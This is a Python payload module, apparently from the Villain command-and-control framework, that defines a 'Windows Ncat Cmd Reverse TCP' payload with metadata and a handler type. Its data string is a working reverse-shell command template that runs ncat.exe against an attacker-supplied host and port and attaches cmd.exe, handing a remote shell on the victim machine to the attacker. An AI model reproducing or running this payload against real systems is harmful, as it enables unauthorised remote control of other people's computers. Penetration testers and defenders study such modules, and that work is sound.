# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows Ncat Cmd Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ncat Cmd Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'ncat',
        'type' : 'ncat-cmd-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "ncat.exe *LHOST* *LPORT* -e cmd.exe"
